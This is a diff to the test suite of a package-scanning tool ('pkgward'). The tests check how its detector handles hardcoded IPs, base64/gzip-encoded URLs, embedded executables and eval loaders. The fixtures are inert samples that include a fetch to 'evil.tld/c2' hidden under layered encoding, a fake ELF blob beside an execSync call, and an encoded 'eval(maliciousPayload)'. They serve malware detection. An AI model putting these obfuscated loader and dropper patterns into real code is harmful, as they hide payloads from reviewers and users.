@@ -3,7 +3,7 @@ from pathlib import Path
 
 import pytest
 
-from pkgsentry.analyze.iocs import analyze_iocs
+from pkgward.analyze.iocs import analyze_iocs
 
 
 def test_url_detection_suspicious(tmp_path):
@@ -126,7 +126,7 @@ def test_placeholder_ip_skipped(tmp_path):
 
 
 # ── OAST / out-of-band-interaction callback domains (high) ──────────
-from pkgsentry.analyze.iocs import _is_oast_url
+from pkgward.analyze.iocs import _is_oast_url
 
 
 def test_oast_callback_detected_high(tmp_path):
@@ -258,3 +258,129 @@ def test_decode_nonprintable_blob_skipped(tmp_path):
     (tmp_path / "a.js").write_text(f'const k = "{blob}";\n')
     ids = {f.rule_id for f in analyze_iocs(tmp_path)}
     assert "iocs.encoded_url" not in ids and "iocs.encoded_ip" not in ids
+
+
+def test_test_file_downweights_hardcoded_ip_port(tmp_path):
+    # A routable IP:port in a *_test.go fixture is test data, not a C2 beacon:
+    # the finding still fires but is down-weighted to low so it can't drive a verdict.
+    (tmp_path / "plugin_test.go").write_text('addr := "2.1.0.10:1234"\n')
+    findings = analyze_iocs(tmp_path)
+    hits = [f for f in findings if f.rule_id == "iocs.hardcoded_wan_ip_port"]
+    assert hits and all(f.severity == "low" for f in hits)
+
+
+def test_prod_file_keeps_hardcoded_ip_port_high(tmp_path):
+    # Same content in a production file stays high — no blind spot for real code.
+    (tmp_path / "plugin.go").write_text('addr := "2.1.0.10:1234"\n')
+    findings = analyze_iocs(tmp_path)
+    hits = [f for f in findings if f.rule_id == "iocs.hardcoded_wan_ip_port"]
+    assert hits and any(f.severity == "high" for f in hits)
+
+
+def test_test_file_suppresses_url_and_ip_noise(tmp_path):
+    (tmp_path / "helm_test.go").write_text(
+        'u := "https://docs.solo.io/x"\nip := "130.211.204.1"\n')
+    ids = {f.rule_id for f in analyze_iocs(tmp_path)}
+    assert "iocs.url_suspicious" not in ids and "iocs.ipv4" not in ids
+
+
+def test_testdata_dir_treated_as_test(tmp_path):
+    d = tmp_path / "testdata"
+    d.mkdir()
+    (d / "config.yaml").write_text('endpoint: "2.1.0.10:8080"\n')
+    hits = [f for f in analyze_iocs(tmp_path) if f.rule_id == "iocs.hardcoded_wan_ip_port"]
+    assert hits and all(f.severity == "low" for f in hits)
+
+
+def _scan_bytes(tmp_path, b):
+    from pkgward.analyze.iocs import _scan_file
+    f = tmp_path / "f.js"
+    f.write_bytes(b)
+    return [x.rule_id for x in _scan_file(f)]
+
+
+def test_decode_engine_multilayer_url(tmp_path):
+    """The recursive engine catches a URL the single-layer pass can't: b64(gzip(b64()))."""
+    import base64, gzip
+    inner = base64.b64encode(b'fetch("http://evil.tld/c2")')
+    payload = base64.b64encode(gzip.compress(inner))
+    assert "iocs.encoded_url" in _scan_bytes(tmp_path, b'var x="' + payload + b'"')
+
+
+def _scan_named(tmp_path, name, b):
+    """Scan raw bytes written to a chosen filename; return Findings (severity-aware)."""
+    from pkgward.analyze.iocs import _scan_file
+    f = tmp_path / name
+    f.write_bytes(b)
+    return list(_scan_file(f))
+
+
+def _b64_elf():
+    import base64
+    return base64.b64encode(b"\x7fELF" + b"\x02\x01\x01\x00" * 200)
+
+
+def test_decode_engine_recovers_hidden_executable_with_sink_is_dropper(tmp_path):
+    """Embedded native binary + an execution sink in the SAME file = the dropper shape
+    (decode -> write -> execute) -> critical."""
+    body = b'const b="' + _b64_elf() + b'";\nrequire("child_process").execSync(cmd);\n'
+    hits = [f for f in _scan_named(tmp_path, "loader.js", body)
+            if f.rule_id == "iocs.decoded_executable"]
+    assert hits and all(f.severity == "critical" for f in hits)
+
+
+def test_embedded_binary_no_exec_sink_is_not_dropper(tmp_path):
+    """A binary decoded to be parsed/shipped (no execution primitive anywhere in the file)
+    is an embedded resource, not a dropper — fire but at medium, can't drive a verdict.
+    (cert/installer tooling that base64s a binary to inspect it.)"""
+    body = b'const b="' + _b64_elf() + b'";\nparsePE(b);\n'
+    hits = [f for f in _scan_named(tmp_path, "parse.js", body)
+            if f.rule_id == "iocs.decoded_executable"]
+    assert hits and all(f.severity == "medium" for f in hits)
+
+
+def test_embedded_binary_in_test_file_is_fixture(tmp_path):
+    """The smallstep/cli winpe_test.go FP: a *_test.go that decodes a PE to test PE
+    parsing, with no exec sink, is fixture data -> low, never critical."""
+    body = b'var ChromeExe = []byte(`' + _b64_elf() + b'`)\n_ = extractPE(name)\n'
+    hits = [f for f in _scan_named(tmp_path, "winpe_test.go", body)
+            if f.rule_id == "iocs.decoded_executable"]
+    assert hits and all(f.severity == "low" for f in hits)
+
+
+def test_decode_engine_recovers_hidden_executable(tmp_path):
+    """Rule still fires (at some severity) on a bare embedded binary — presence check."""
+    assert "iocs.decoded_executable" in _scan_bytes(tmp_path, b'const b="' + _b64_elf() + b'"')
+
+
+def test_decode_engine_ignores_benign_base64(tmp_path):
+    """Benign base64 data (no URL/code/exe) must NOT fire decoded_* (the fazzgram class)."""
+    import base64
+    blob = base64.b64encode(b"just some serialized framework strings: Context dispatcher getMe")
+    rids = _scan_bytes(tmp_path, b'var d="' + blob + b'"')
+    assert "iocs.decoded_executable" not in rids
+    assert "iocs.decoded_code" not in rids
+
+
+def test_decode_no_fp_on_reverse_reverse_source(tmp_path):
+    """The flood bug: reverse->reverse is identity, 'recovering' visible source whose
+    require()/function() tokens are NOT a hidden payload. Must be silent."""
+    src = b"const x = require('lodash');\nfunction handler(){ return doStuff(); }\n" * 30
+    rids = _scan_bytes(tmp_path, src)
+    assert "iocs.decoded_code" not in rids
+    assert "iocs.decoded_executable" not in rids
+
+
+def test_decoded_code_needs_real_sink_not_just_code_tokens(tmp_path):
+    """base64 of benign code (a bundle chunk / source map) has require()/function() but no
+    execution sink — must NOT fire decoded_code."""
+    import base64
+    blob = base64.b64encode(b"function helper(){ return config.value }")
+    assert "iocs.decoded_code" not in _scan_bytes(tmp_path, b'var d="' + blob + b'"')
+
+
+def test_decoded_code_fires_on_real_encoded_eval_loader(tmp_path):
+    """b64(gzip(b64('eval(payload)'))) — a real encoding chain decoding to an exec sink."""
+    import base64, gzip
+    p = base64.b64encode(gzip.compress(base64.b64encode(b"eval(maliciousPayload)")))
+    assert "iocs.decoded_code" in _scan_bytes(tmp_path, b'var p="' + p + b'"')
